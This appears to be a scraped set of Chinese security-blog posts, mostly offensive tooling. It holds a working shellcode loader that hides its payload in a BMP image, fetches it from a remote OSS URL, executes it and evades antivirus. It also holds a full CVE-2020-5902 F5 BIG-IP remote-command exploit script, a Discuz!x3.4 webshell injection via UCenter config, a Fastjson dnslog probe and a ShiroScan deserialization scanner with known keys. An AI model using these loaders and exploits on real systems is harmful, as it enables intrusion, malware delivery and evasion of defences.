dwBmpSize) { delete[]pBuf; pBuf = 0; return false; } CloseHandle(hfile); m_fileHdr = (BITMAPFILEHEADER*)pBuf; m_infoHdr = (BITMAPINFOHEADER*)(pBuf + sizeof(BITMAPFILEHEADER)); return true; //成功话就是文件的内容读取到pBuf里面 } int CBMPHide::getBmpWidth() { return m_infoHdr-&gt;biWidth; } int CBMPHide::getBmpHeight() { return m_infoHdr-&gt;biHeight; } int CBMPHide::getBmpBitCount() { return m_infoHdr-&gt;biBitCount; } bool CBMPHide::save() { string sDstFileName = &quot;save.bmp&quot;; HANDLE hfile = CreateFileA(sDstFileName.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, 0, 0); if (hfile == INVALID_HANDLE_VALUE) { return false; } DWORD dwWritten = 0; WriteFile(hfile, pBuf, dwBmpSize + 83968, &amp;dwWritten, 0); if (dwBmpSize != dwWritten) { return false; } CloseHandle(hfile); return true; } //隐藏一个字符串到图片中，把字符串拆成字节，写入每个像素的alpha通道中 bool CBMPHide::hideString2BMP(char* szStr2Hide) { LPBYTE pAlpha = pBuf + m_fileHdr-&gt;bfOffBits + 3; //第一个像素的通道位置 //cout &lt;&lt; pAlpha &lt;&lt; endl; int nHide; //成功隐藏的字节数 //每次循环写入一个字节，吸入alpha通道 //(pAlpha - pBuf) &lt; m_fileHdr-&gt;bfSize这个是判断字符串是太大，图片不能隐藏 for (nHide = 0; (pAlpha - pBuf) &lt; m_fileHdr-&gt;bfSize &amp;&amp; szStr2Hide[nHide] != 0; nHide++, pAlpha += 4) { //cout &lt;&lt; nHide &lt;&lt; endl; *pAlpha = szStr2Hide[nHide]; //写入一个字节 //cout &lt;&lt; pAlpha &lt;&lt; endl; } return true; } void CBMPHide::showStringInBmp(char* szBmpFIleName/*=NULL*/) { string sDstFileName = &quot;save.bmp&quot;; sDstFileName = szBmpFIleName; HANDLE hfile = CreateFileA(sDstFileName.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, 0); if (hfile == INVALID_HANDLE_VALUE) { return; } DWORD dwSize = GetFileSize(hfile, 0); LPBYTE pBuf1 = new byte[dwSize]; DWORD dwRead = 0; ReadFile(hfile, pBuf1, dwSize, &amp;dwRead, 0); CloseHandle(hfile); //文件内容读取到pBuf1中 BITMAPFILEHEADER* pHdr = (BITMAPFILEHEADER*)pBuf1; LPBYTE pStr = pBuf1 + pHdr-&gt;bfOffBits + 3; char szTmp[1280]; RtlZeroMemory(szTmp, 1280); for (int i = 0; i &lt; 1280; i++) { if (*pStr == 0 || *pStr == 0xFF) { break; } szTmp[i] = *pStr; pStr += 4; } printf_s(szTmp); delete[]pBuf1; } int main(int argc, char* argv[]) { if (argc &lt; 2) { wprintf(L&quot;Command: %S &lt;SHELLCODE&gt; ...\\n&quot;, argv[0]); return -1; } CBMPHide hide; hide.setBmpFileName((char*)&quot;test.bmp&quot;); printf_s(&quot;test.bmp width:%d,height:%d,bitCount%d\\n&quot;, hide.getBmpWidth(), hide.getBmpHeight(), hide.getBmpBitCount()); char* shellcode = argv[1]; hide.hideString2BMP((char*)shellcode); hide.save(); cout &lt;&lt; shellcode &lt;&lt; endl; } 1. ShellcodeImg.exe 做好生成准备，此exe功能是获得远程图片，执行shellcode Github：https://github.com/sv3nbeast/ImgLoaderShellCode 核心代码 #include &lt;stdio.h&gt; #include &lt;Windows.h&gt; #include &lt;Winhttp.h&gt; #include &lt;WinDNS.h&gt; #include &lt;iterator&gt; #include &lt;iostream&gt; #include &lt;windows.h&gt; #include &lt;WinDNS.h&gt; #include &lt;string&gt; #include &lt;vector&gt; #pragma comment(lib,&quot;Winhttp.lib&quot;) #pragma comment(lib,&quot;urlmon.lib&quot;) using namespace std; struct CachedDnsRecord { wstring name; int type; }; #define INET_ADDRSTRLEN 22 #define INET6_ADDRSTRLEN 65 typedef void(*DownLoadCallback)(int ContentSize, int CUR_LEN); typedef struct _URL_INFO { WCHAR szScheme[512]; WCHAR szHostName[512]; WCHAR szUserName[512]; WCHAR szPassword[512]; WCHAR szUrlPath[512]; WCHAR szExtraInfo[512]; }URL_INFO, * PURL_INFO; void dcallback(int ContentSize, int file_size) { //printf(&quot;count:%d,size:%d\\n&quot;, ContentSize, file_size); } void download(const wchar_t* Url, const wchar_t* FileName, DownLoadCallback Func) { URL_INFO url_info = { 0 }; URL_COMPONENTSW lpUrlComponents = { 0 }; lpUrlComponents.dwStructSize = sizeof(lpUrlComponents); lpUrlComponents.lpszExtraInfo = url_info.szExtraInfo; lpUrlComponents.lpszHostName = url_info.szHostName; lpUrlComponents.lpszPassword = url_info.szPassword; lpUrlComponents.lpszScheme = url_info.szScheme; lpUrlComponents.lpszUrlPath = url_info.szUrlPath; lpUrlComponents.lpszUserName = url_info.szUserName; lpUrlComponents.dwExtraInfoLength = lpUrlComponents.dwHostNameLength = lpUrlComponents.dwPasswordLength = lpUrlComponents.dwSchemeLength = lpUrlComponents.dwUrlPathLength = lpUrlComponents.dwUserNameLength = 512; WinHttpCrackUrl(Url, 0, ICU_ESCAPE, &amp;lpUrlComponents); HINTERNET hSession = WinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_NO_PROXY, NULL, NULL, 0); DWORD dwReadBytes, dwSizeDW = sizeof(dwSizeDW), dwContentSize, dwIndex = 0; HINTERNET hConnect = WinHttpConnect(hSession, lpUrlComponents.lpszHostName, lpUrlComponents.nPort, 0); HINTERNET hRequest = WinHttpOpenRequest(hConnect, L&quot;HEAD&quot;, lpUrlComponents.lpszUrlPath, L&quot;HTTP/1.1&quot;, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_REFRESH); WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0); WinHttpReceiveResponse(hRequest, 0); WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_CONTENT_LENGTH | WINHTTP_QUERY_FLAG_NUMBER, NULL, &amp;dwContentSize, &amp;dwSizeDW, &amp;dwIndex); WinHttpCloseHandle(hRequest); hRequest = WinHttpOpenRequest(hConnect, L&quot;GET&quot;, lpUrlComponents.lpszUrlPath, L&quot;HTTP/1.1&quot;, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_REFRESH); WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0); WinHttpReceiveResponse(hRequest, 0); BYTE* pBuffer = NULL; pBuffer = new BYTE[dwContentSize]; ZeroMemory(pBuffer, dwContentSize); do { WinHttpReadData(hRequest, pBuffer, dwContentSize, &amp;dwReadBytes); Func(dwContentSize, dwReadBytes); } while (dwReadBytes == 0); //cout &lt;&lt; pBuffer &lt;&lt; endl; BITMAPFILEHEADER* pHdr = (BITMAPFILEHEADER*)pBuffer; LPBYTE pStr = pBuffer + pHdr-&gt;bfOffBits + 3; char szTmp[1900]; RtlZeroMemory(szTmp, 1900); for (int i = 0; i &lt; 1900; i++) { if (*pStr == 0 || *pStr == 0xFF) { break; } szTmp[i] = *pStr; pStr += 4; } unsigned int char_in_hex; unsigned int iterations = strlen(szTmp); unsigned int memory_allocation = strlen(szTmp) / 2; VirtualProtect(szTmp, memory_allocation, PAGE_READWRITE, 0); for (unsigned int i = 0; i &lt; iterations / 2; i++) { sscanf_s(szTmp + 2 * i, &quot;%2X&quot;, &amp;char_in_hex); szTmp[i] = (char)char_in_hex; } void* abvc = VirtualAlloc(0, memory_allocation, MEM_COMMIT, PAGE_READWRITE); memcpy(abvc, szTmp, memory_allocation); DWORD ignore; VirtualProtect(abvc, memory_allocation, PAGE_EXECUTE, &amp;ignore); (*(void(*)()) abvc)(); delete pBuffer; WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); } typedef struct _DNS_CACHE_ENTRY { struct _DNS_CACHE_ENTRY* pNext; // Pointer to next entry PWSTR pszName; // DNS Record Name unsigned short wType; // DNS Record Type unsigned short wDataLength; // Not referenced unsigned long dwFlags; // DNS Record Flags } DNSCACHEENTRY, * PDNSCACHEENTRY; typedef int(WINAPI* DNS_GET_CACHE_DATA_TABLE)(PDNSCACHEENTRY); vector&lt;CachedDnsRecord&gt; getDnsCache() { vector&lt;CachedDnsRecord&gt; results; PDNSCACHEENTRY pEntry = (PDNSCACHEENTRY)malloc(sizeof(DNSCACHEENTRY)); HINSTANCE hLib = LoadLibrary(TEXT(&quot;DNSAPI.dll&quot;)); DNS_GET_CACHE_DATA_TABLE DnsGetCacheDataTable = (DNS_GET_CACHE_DATA_TABLE)GetProcAddress(hLib, &quot;DnsGetCacheDataTable&quot;); int stat = DnsGetCacheDataTable(pEntry); pEntry = pEntry-&gt;pNext; while (pEntry) { CachedDnsRecord record; record.name = wstring(pEntry-&gt;pszName); record.type = pEntry-&gt;wType; results.push_back(record); pEntry = pEntry-&gt;pNext; } free(pEntry); if (!results.empty()) { download(L&quot;https://code.oss-cn-beijing.aliyuncs.com:80/save.bmp&quot;, L&quot;1633Music&quot;, &amp;dcallback); } else { exit(0); } return results; } int main() { HWND hwndDOS = GetForegroundWindow(); ShowWindow(hwndDOS, SW_HIDE); auto cache = getDnsCache(); return 0; } 0x04 开始运行 1. 将任意.bmp图片文件改成test.bmp放入生成的getImgshellcode.exe同目录,并且复制生成好的Hex编码后的shellcode，进行注入,同目录生成save.bmp 2. 上传save.bmp到阿里OSS里，点击上传的图片获得访问URL并复制 3. 生成ShellcodeImg.exe，先修改176行的图片地址为上步骤的URL在生成 4. 在公网vps模拟真实环境运行AV情况下执行ShellcodeImg.exe，并未遭到拦截，且成功执行命令 0x05 &quot;可能&quot;会有用的小知识 1. \b\b如果想要在其他机器运行成功VS生成的exe时，生成时要选择Release，为了兼容性选择x86，然后生成即可 2. VS建造的项目文件夹都会存在.sln文件，双击.sln文件即可自动打开整个项目，还原项目本身 0x06 &quot;可能&quot;会遇到的问题 1. exe执行后无法正常上线，原因可能是填入图片URL的时候没有加入端口，导致并未成功下载图片解析，如图就是没有写端口导致运行时并未成功获得图片进行解析 正确：https://code.oss-cn-beijing.aliyuncs.com:80/save.bmp 错误：https://code.oss-cn-beijing.aliyuncs.com/save.bmp 【可改进的地方】: 现在的操作是运行exe后生成控制台然后关闭控制台操作，会有控制台闪一下然后消失的界面，过程虽然很快，但对配置低的机器还是有感的，如果添加运行exe后不出现控制台也就是不出现窗口直接隐藏后台静默执行的代码生成后会被AV检测查杀，希望以后有师傅进行改进吧 0.0 ! 可能会有人感觉写得啰嗦~ 其实是因为本人也是自己学习，都是摸索着来，所以对一些 &quot;坑&quot; 的基础小问题很敏感，因为在完全不会的情况下遇到其实都还蛮懵的，同样问题对不同的人来说难度确实是不一样的，所以，我还是赶紧衮去继续学习吧 ","link":"https://www.svenbeast.com/post/xue-xi-tu-pian-yin-xie-shellcode-jin-xing-yuan-cheng-jia-zai-guo-av/"},{"title":"CVE-2020-5902 BIG-IP RCE  绕过tmsh限制命令执行&EXP编写","content":"0x01 背景 最近 F5 Networks的网络和安全产品BIG IP应用交付控制器曝出漏洞，昨天晚上10点时有人在推特发布了POC，随即尝试跟进此漏洞并编写EXP。 0x02 POC twitter: https://twitter.com/x4ce/status/1279790599793545216 Read File Example: /tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd GET /tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd HTTP/1.1 Host: 127.0.0.1 Connection: close Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,ar;q=0.8 Cookie: JSESSIONID=89E562018185E75966F67E7FC50CF6E1 F5 RCE Example: /tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user GET /tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user HTTP/1.1 Host: 127.0.0.1 Connection: close Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,ar;q=0.8 Cookie: JSESSIONID=07E7975B5F6F4B43F3375AA5FFB32628 0x03 尝试执行命令 此处思路是利用alias绕过tmsh限制，学习自msf脚本，目前还未合并到msf中 修改alias ，将list设置成bash命令 htts://x.x.x.x/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash 生成bash文件并写入要执行的命令 htts://x.x.x.x/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/checksafe&amp;content=whoami 执行bash文件 htts://x.x.x.x/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/checksafe 还原alias设置，防止影响目标正常使用 https://x.x.x.x/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list Example: 这是命令成功执行后的回显，此处执行的是whoami命令 0x04 EXP 编写一个exp脚本以便以后碰到后节省时间 Github: https://github.com/sv3nbeast/CVE-2020-5902_RCE import requests #by 斯文 import sys import json requests.packages.urllib3.disable_warnings() banner= ''' ______ _______ ____ ___ ____ ___ ____ ___ ___ ____ / ___\\ \\ / / ____| |___ \\ / _ \\___ \\ / _ \\ | ___|/ _ \\ / _ \\___ \\ | | \\ \\ / /| _| _____ __) | | | |__) | | | |____|___ \\ (_) | | | |__) | | |___ \\ V / | |__|_____/ __/| |_| / __/| |_| |_____|__) \\__, | |_| / __/ \\____| \\_/ |_____| |_____|\\___/_____|\\___/ |____/ /_/ \\___/_____| by 斯文 ''' headers = { 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36' } def check(url, cmd): try: print('[+ 开始测试目标: {} 命令: {}'.format(url,cmd)) del_alias = url + '/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list' creat_alias = url + '/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash' write_bash = url + '/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/checksafe&amp;content={}'.format(cmd) exec_bash = url + '/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/checksafe' print('[+ 正在还原alias设置，防止其他人未修改回来') x = requests.get(del_alias,headers=headers,verify=False,timeout=30) print('[+ 正在将list命令劫持为bash') y = requests.get(creat_alias,headers=headers,verify=False,timeout=30) print('[+ 正在写入bash文件') z = requests.get(write_bash,headers=headers,verify=False,timeout=30) print('[+ 正在执行命令,请查看output字段值'+'\\n') g = requests.get(exec_bash,headers=headers,verify=False,timeout=30) requests.get(del_alias,headers=headers,verify=False,timeout=30) text = g.content.decode('utf-8') print(text.strip('\\n')) except: print('[- 请查看目标是否可以正常访问') if __name__ == &quot;__main__&quot;: try: url = sys.argv[1] cmd = sys.argv[2] if url[-1] == '/':url=url[0:-1] print(banner) check(url=url,cmd=cmd) except Exception as e: # print(e) print('python3 CVE-2020-5902.py http://x.x.x.x whoami') 0x05 坑点 在执行前可尝试先还原一遍alias的设置，防止list命令已被篡改 文件读取和RCE是两个单独的漏洞，不是说存在文件读取就会存在RCE，两者影响版本不同 ","link":"https://www.svenbeast.com/post/cve-2020-5902-big-ip-rce-rao-guo-tmsh-xian-zhi-ming-ling-zhi-xing-andexp-bian/"},{"title":"Discuz!x3.4 后台修改UCenter配置getshell","content":"0x01 背景 2020年5月20日。。。 帮朋友测试时遇到了discuz!x3.4，由此记录一下，感谢QAX A-team的干货帖子拉~ 最近通过朋友推荐，换了本子0.0 ，有点不适应，各种安软件安环境然后又改了博客样式，终于可以发文章拉 对新本子的颜值和速度很满意，附图小小的秀一把 0x02 主题 环境搭建：windows+phpstudy+Discuz!x3.4 Discuz!x3.4：https://github.com/sv3nbeast/discuz-x3.4-RCE 0x03 利用 进入后台站长-UCenter设置，修改UCenter通信密钥为123456并记录下来，填入code.php，修改UC_API=http://192.168.0.106/discuz!x3.4/uc_server');eval($_POST[sven]);//，点击保存 生成code参数的值(code.php代码见末尾) 生成code值 &lt;?php $uc_key=&quot;123456&quot;;//此处填写刚才UCenter设置的值 $time = time() + 720000; $str = &quot;time=&quot;.$time.&quot;&amp;action=updateapps&quot;; $code = authcode($str,&quot;ENCODE&quot;,$uc_key); $code = str_replace('+','%2b',$code); $code = str_replace('/','%2f',$code); echo $code; function authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) { $ckey_length = 4; $key = md5($key != '' ? $key : '123456'); $keya = md5(substr($key, 0, 16)); $keyb = md5(substr($key, 16, 16)); $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : ''; $cryptkey = $keya.md5($keya.$keyc); $key_length = strlen($cryptkey); $string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string; $string_length = strlen($string); $result = ''; $box = range(0, 255); $rndkey = array(); for($i = 0; $i &lt;= 255; $i++) { $rndkey[$i] = ord($cryptkey[$i % $key_length]); } for($j = $i = 0; $i &lt; 256; $i++) { $j = ($j + $box[$i] + $rndkey[$i]) % 256; $tmp = $box[$i]; $box[$i] = $box[$j]; $box[$j] = $tmp; } for($a = $j = $i = 0; $i &lt; $string_length; $i++) { $a = ($a + 1) % 256; $j = ($j + $box[$a]) % 256; $tmp = $box[$a]; $box[$a] = $box[$j]; $box[$j] = $tmp; $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256])); } if($operation == 'DECODE') { if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) { return substr($result, 26); } else { return ''; } } else { return $keyc.str_replace('=', '', base64_encode($result)); } } ?&gt; 带code参数GET发送请求(发送这个请求前后台功能都是不正常的，发送后后台恢复正常) 请求数据包 GET /discuz!x3.4/api/uc.php?code=ac7091oTLALD6X24gZeiX5YmqDkLnX4ivIqx1jDnA7NhUAcHHOX3fWWOLWpGwSwfQfz4r5Pgf86bRlDTRkQ% HTTP/1.1 Host: 192.168.0.106 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,ar;q=0.8 Connection: close Content-Length: 133 &lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt; &lt;root&gt; &lt;item id=&quot;UC_API&quot;&gt;http://192.168.0.106/discuz!x3.4/uc_server&lt;/item&gt; &lt;/root&gt; 此时 http://192.168.0.106/discuz!x3.4/config/config_ucenter.php就是我们的shell地址，至此getshell结束 ","link":"https://www.svenbeast.com/post/discuzx34-hou-tai-xiu-gai-uc_center-pei-zhi-getshell/"},{"title":"搭建自己的dnslog平台并以此来发现Fastjson资产","content":"0x01 ^$&amp;!#@* 因为ceye总是宕机，dnslog.cn不适合脚本化查询， 所以就需要用自己的平台了， 记录借助xray建立dnslog平台并以此来检测fastjson资产的过程（xray官方文档没写全，踩了点小坑） 0x02 准备零件 1.一台服务器，最低配置都没事，能运行xray就行（设为我的服务器ip为：123.321.213.2） 2.在阿里云购买域名（dnslog.cool）其他处不行哦，免费域名厂商的也可以，因为需要有设定DNS Host的功能 0x03 配置过程 https://wanwang.aliyun.com/?spm=5176.12825654.eofdhaal5.9.3dbd2c4apKHcoB&amp;aly_as=TNeZQ8Wpi 1.此处购买域名，任意即可，因本人强迫症，购买dnslog.cool，跟随阿里云的购买流程即可，配置邮箱，配置个人信息等 2.自定义DNS Host：等待实名认证审核完成，一般10到20分钟即可，前往自定义DNS Host功能处创建2个DNS服务器，比如设置sven1.dnslog.cool,sven2.dnslog.cool，IP地址填写服务器ip:123.321.213.2 3.DNS修改：前往DNS修改功能，修改dns服务器为sven1.dnslog.cool,sven2.dnslog.cool 4.域名解析：然后点击左边的域名解析功能，填加2条解析记录，主机记录填写sven1，记录类型为A，解析线路为默认，记录值为123.321.213.2(我的服务器ip)，剩下默认即可，第二条解析记录的主机记录填写sven2，其他同上条 5.确定域名的实名认证审核完成后，登录服务器（必须拥有独立外网ip的哦），下载xray，先使用命令行xray.exe reverse运行一遍，自动生成config.yaml，然后打开config.yaml，找到配置反连平台得配置（270行上下十来行都是），替换成如下程度，按照自己实际情况更换密码和ip和域名和dns服务器的前缀后运行xray（xray.exe reverse），运行完毕后访问链接：http://123.321.213.2:8001，就是dnslog管理平台了 reverse: db_file_path: &quot;reverse.db&quot; token: &quot;123!@#QWE&quot; //此处是设置登录反连平台得密码 http: enabled: true listen_ip: 0.0.0.0 listen_port: &quot;8001&quot; dns: enabled: true listen_ip: 0.0.0.0 domain: &quot;dnslog.cool&quot; is_domain_name_server: false # 静态解析规则 resolve: - type: A record: sven1 value: 123.321.213.2 ttl: 60 - type: A record: sven2 ttl: 60 value: 123.321.213.2 rmi: enabled: true listen_ip: 0.0.0.0 listen_port: 8088 resolve: - type: A # A, AAAA, TXT 三种 record: localhost value: 127.0.0.1 ttl: 60 client: http_base_url: &quot;&quot; dns_server_ip: &quot;123.321.213.2&quot; remote_server: false 6.生成用来检测的域名：复制好后直接ping xxxxxx.dnslog.cool即可收到请求 0x04 fastjson资产检测 利用dnslog回显检测后端是否使用fastjson Payload之一: {&quot;e&quot;:{&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;hbs9jr.dnslog.cn&quot;}} 这样我的批量多线程检测脚本也就完成了，当然也只是一种思路，还有其他增加检测率的方法，部分代码如下 try: randStr = ''.join(random.sample(string.ascii_letters + string.digits, 4)) dnslog = '{'+'&quot;e&quot;:'+'{'+'&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;p-1111-pgfx.{}.dnslog.cool&quot;'.format(randStr)+'}'+'}' line=line.strip('\\n') k = requests.get(line,headers=fastjson_header,data=dnslog,allow_redirects=False,verify=False,timeout=10) time.sleep(1) check = 'http://11111111111:8001/_/api/event/list?lastID=&amp;count=5&amp;eventType=dns&amp;action=Next' wb_data = requests.get(check,headers=check_header,timeout=10) req = wb_data.text if randStr in req: print(&quot;[+ &quot;+&quot; 存在fastjson: &quot;+&quot;状态码:&quot;+str(k.status_code)+&quot;:&quot;+' url:'+line) f.write(line+&quot;\\n&quot;) else: print(&quot;[- &quot;+&quot; 不存在fastjson &quot;+&quot;状态码:&quot;+str(k.status_code)+&quot;:&quot;+' url:'+line) except Exception as e: print(e) pass 吐槽 1.xray说明文档未写清需要去域名解析配置dns服务器的解析 2.浪费了一个域名，dnslog.run，在腾讯云买的，当时没有找到自定义dnslog服务器功能，后来有了。 3.所以都怪ceye没事宕个机 -.- ! ","link":"https://www.svenbeast.com/post/16--phe4I/"},{"title":"Shiro反序列化利用工具ShiroScan代码重构，速度增加300%，成功率增加30%","content":"0x01 背景 周六日在家无聊，周六写的某自动提交，周日想起了当初因为某些原因写的ShiroScan，既然现在也有很多师傅在用，就准备重新改一下，毕竟当初为了赶速度，代码不能看-.-！ 下载链接：https://github.com/sv3nbeast/ShiroScan 0x02 新增多线程 当然首先要增加速度，使用的是python的threadpool这个老模块，下方是个别代码，其实插件模块里的插件代码全部都变了，虽模块增加但预计增加速度300% 为了脚本运行简单，多线程数量不是使用者传参控制，默认20线程，如需改动请到/moule/main.py第20行代码自行修改控制线程的参数 def multithreading(self,funcname,url ,command, pools): key = ['kPH+bIxk5D2deZiIxcaaaA==1234url3456'+url+'1234command3456'+command+'1234sven3456','wGiHplamyXlVB11UXWol8g==1234url3456'+url+'1234command3456'+command+'1234sven3456','2AvVhdsgUs0FSA3SDFAdag==1234url3456'+url+'1234command3456'+command+'1234sven3456','4AvVhmFLUs0KTA3Kprsdag==1234url3456'+url+'1234command3456'+command+'1234sven3456', '3AvVhmFLUs0KTA3Kprsdag==1234url3456'+url+'1234command3456'+command+'1234sven3456','Z3VucwAAAAAAAAAAAAAAAA==1234url3456'+url+'1234command3456'+command+'1234sven3456','U3ByaW5nQmxhZGUAAAAAAA==1234url3456'+url+'1234command3456'+command+'1234sven3456','wGiHplamyXlVB11UXWol8g==1234url3456'+url+'1234command3456'+command+'1234sven3456', '6ZmI6I2j5Y+R5aSn5ZOlAA==1234url3456'+url+'1234command3456'+command+'1234sven3456','fCq+/xW488hMTCD+cmJ3aQ==1234url3456'+url+'1234command3456'+command+'1234sven3456','1QWLxg+NYmxraMoxAXu/Iw==1234url3456'+url+'1234command3456'+command+'1234sven3456','ZUdsaGJuSmxibVI2ZHc9PQ==1234url3456'+url+'1234command3456'+command+'1234sven3456', 'L7RioUULEFhRyxM7a2R/Yg==1234url3456'+url+'1234command3456'+command+'1234sven3456','r0e3c16IdVkouZgk1TKVMg==1234url3456'+url+'1234command3456'+command+'1234sven3456','5aaC5qKm5oqA5pyvAAAAAA==1234url3456'+url+'1234command3456'+command+'1234sven3456','bWluZS1hc3NldC1rZXk6QQ==1234url3456'+url+'1234command3456'+command+'1234sven3456', 'a2VlcE9uR29pbmdBbmRGaQ==1234url3456'+url+'1234command3456'+command+'1234sven3456','WcfHGU25gNnTxTlmJMeSpw==1234url3456'+url+'1234command3456'+command+'1234sven3456','bWljcm9zAAAAAAAAAAAAAA==1234url3456'+url+'1234command3456'+command+'1234sven3456','MTIzNDU2Nzg5MGFiY2RlZg==1234url3456'+url+'1234command3456'+command+'1234sven3456', '5AvVhmFLUs0KTA3Kprsdag==1234url3456'+url+'1234command3456'+command+'1234sven3456'] pool = threadpool.ThreadPool(pools) requests = threadpool.makeRequests(funcname,key) [pool.putRequest(req) for req in requests] pool.wait() def poc(self,url, command, thre): self.multithreading(self.generator, url, command, thre) return False 0x03 新增利用链 在过往几个月有部分大佬放出了自己的类似工具，有我很多需要学习的地方-.-! ，所以这次增加了新的利用链，代码表现为新增了4个模块，尤其是CommonsCollections10，预计增加成功率30% 利用链详情为此篇文章（推荐给此类研究的师傅看）：https://www.anquanke.com/post/id/190468（Java反序列化利用链分析之CommonsCollections5,6,7,9,10） 所以现在的ysoserial.jar包是新的，请勿更换成自己的jar包哦 0x04 坑点 python的threadpool模块中threadpool.makeRequests这里传参不能使用超过2个参数，难住我了，最后解决办法是参数集合成1个参数，到了方法里在正则取出需要的参数-.-! （此处别笑，掌声。。） 0x05 忽略 dnslog回显来确定key这个功能，我不太想要0.0，其实还能确定使用的模块，但是都需要使用者命令行传参，会让我在用脚本的时候想命令的时间多1秒，要不功能就全集成在脚本内，要不就不要，因为当初是个菜J的时候（现在也是-.-!）看到个脚本一堆冗余功能就头痛，花里胡哨的，除了浪费时间就是浪费时间，当然大型，连载的工具排除哈，脚本嘛，就是为了某个目的做的一键工具 但是有个师傅的工具可以直接检测出使用的是什么key，目前我还不会，所以说菜才是原罪-.-!，如果有会的师傅告诉我下就好了。。 这个工具其实就是为了探测是否存在可利用的shiro反序列化漏洞，仅此而已哈，我表示最喜欢的工具类型就是最少的命令实现较多的功能，应该有志同道合的朋友吧~ 其实光检测的话使用URLDNS这个利用链就可以，但是有的时候这个URLDNS成功不代表可以利用，如果继续增加检测率，其实用JRMPClient我觉得更好，但是会增加一些使用者操作，所以就不放出来了，而且会的师傅也并不依赖工具，完全可以自己操作-.- ! ","link":"https://www.svenbeast.com/post/tskRKJIPg/"},{"title":"【无错漏优化版】批量百度权重查询工具","content":"0x01 原因 造个轮子的原因是因为其他的权重查询用着好像不是太友好，总是有些小毛病，漏一个，少一个，结果不对的一些问题，自己就也弄一个，有个缺点就是慢点，优点就是查的比较稳，很少出现结果是n或者漏几个url的问题 0x02 代码 主程序代码： # coding=utf-8 import requests #Author:斯文 import re import time from threading import Thread from selenium import webdriver from selenium.webdriver.chrome.options import Options zhanzhang_headers = { 'Host': 'rank.chinaz.com', 'Cache-Control': 'max-age=0', 'Upgrade-Insecure-Requests': '1', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'Accept-Encoding': 'gzip, deflate', 